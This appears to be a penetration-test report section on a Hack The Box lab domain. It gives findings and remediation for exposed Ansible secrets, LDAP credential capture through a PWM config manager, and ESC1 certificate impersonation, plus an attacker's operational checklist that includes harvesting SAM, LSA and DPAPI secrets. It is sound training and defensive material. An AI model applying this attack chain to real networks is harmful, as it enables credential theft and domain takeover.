The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Security findings and recommendations

These findings are attack-chain-oriented, not invented vulnerability-scan results. No numerical CVSS values are asserted because a complete CVSS environmental assessment was not performed.

#### F-01 - Guest access exposes sensitive automation assets **(High)**

**Affected:** SMB `Development` share, `Automation\Ansible`.  
**Category:** Improper access control / exposure of sensitive information; credential-management weaknesses.  
**Evidence:** Guest-readable Ansible roles, plaintext deployment credential, Tomcat credential template, Vault-encrypted secrets and deployment configuration.  
**Impact:** Low-privilege or guest users can gather infrastructure layout and attack-useful credentials; exposed Vault material is susceptible to offline password recovery.  
**Remediation:** Restrict share permissions to specific maintainers, remove secrets from templates and inventory, use dedicated secret management, limit local distribution of Vault files, use high-entropy independent Vault passphrases, rotate exposed secrets, and audit access to sensitive deployment material.

#### F-02 - Exposed PWM Configuration Manager enables LDAP credential exposure **(Critical in demonstrated chain)**

**Affected:** PWM on `https://authority.authority.htb:8443/pwm`, especially configuration-mode administration and LDAP proxy connection settings.  
**Evidence:** Configuration-mode notice; accessible Manager and backup/config exports; encrypted live proxy password field; LDAP bind DN in XML/LocalDB; a live LDAP simple-bind password captured from an inbound connection at the attacker listener.  
**Impact:** An attacker who obtains access to PWM configuration and can direct the LDAP client to a listener may recover a domain service-account credential. The demonstrated credential gave an interactive domain foothold.  
**Remediation:** Keep PWM outside configuration mode during normal operation; require strong, restricted administrative authentication; limit management interface network access; restrict outbound LDAP destinations; enforce encrypted, validated LDAPS/StartTLS and never send simple binds to untrusted plaintext endpoints; pin/validate server trust appropriately; rotate the LDAP bind secret; minimize the proxy account's privileges; monitor unusual configuration changes and LDAP destination changes.

**Scope qualification:** The exact browser configuration modification resulting in the observed inbound bind was not captured, so include that verification step if producing a formal reproducibility package.

#### F-03 - ESC1 certificate impersonation via CorpVPN and computer account creation **(Critical)**

**Affected:** CA `AUTHORITY-CA`, template `CorpVPN`.  
**Category:** Improper privilege management / certificate template security misconfiguration.  
**Evidence:** Template's `EnrolleeSuppliesSubject=True`, Client Authentication capability, no manager approval, enrollment rights for `Domain Computers`; successful creation of `ENKLAB01$`; request ID `2`, Administrator UPN certificate issuance; Certipy `-ldap-shell` identity `HTB\Administrator`.  
**Impact:** A compromised domain identity capable of adding computer accounts can create an eligible principal, issue a certificate for a higher-value identity, and authenticate to a domain service as that identity.  
**Remediation:** Remove requester-supplied subject names where unnecessary; restrict template enrollment to tightly governed principals; remove Client Authentication from templates not intended for identity logon; review machine-account creation quota and permissions; apply appropriate certificate-mapping hardening; monitor computer-account creation and CA enrollment activity; revoke illegitimately issued certificates and review CA logs.

#### F-04 - Operational weaknesses (supporting observations)

- **LDAPS certificate validation failure:** PWM reported `PKIX path building failed`; treat this as a configuration/availability and trust-store issue, not as proof of a password failure.
- **Clock skew:** Nmap/BloodHound observed ~4 hours of skew, breaking Kerberos operations. Use time synchronization and correct DNS in the lab before escalating Kerberos-related errors.
- **HTTP TRACE:** Nmap flagged TRACE on IIS/80; impact not established. Do not elevate to an exploitable issue without evidence.

### Operational checklist for the next CPTS-style box

1. **Recon:** Full TCP scan, service scripts, DNS SRV/AXFR, web applications including installer/setup/config mode, HTTPS redirects, SMTP/FTP/SMB as applicable.
2. **Credential provenance:** Record *where each secret came from*, *which identity it belongs to*, and *the protocol on which it was validated*. Do not treat service-account naming coincidences as proof.
3. **Exposure capture:** Preserve exact SMB relative paths and fetch files with unique local filenames. Hash downloaded evidence files when possible.
4. **Web applications:** Thoroughly enumerate management interfaces, backups/exports, connection-test features, integration URLs, and trust failures before abandoning the web lead.
5. **AD foothold:** Verify context (`whoami /all`), groups, writable attributes/ACLs, accessible shares, and BloodHound findings. Fix time/DNS early if Kerberos-dependent tooling fails.
6. **AD CS:** Enumerate actual CA/template permissions and prerequisites; evaluate whether a *computer account* is eligible when user enrollment is blocked. Prefer evidence over treating vulnerability labels as automatic exploitability.
7. **Alternative certificate auth:** If PKINIT fails after issuance, test supported LDAP certificate authentication without assuming the certificate is invalid.
8. **Reporting after every pivot:** Evidence ID, command, target, credential source, exact output, access level, user impact, and remediation. Record dead ends and mark unrecorded steps rather than inventing them.
9. **Windows post-compromise:** When scope and remaining objectives warrant, check local secrets (SAM/SYSTEM/SECURITY, LSA, DPAPI, service accounts) and session privilege boundaries, but **do not mark them as done unless executed**.

---
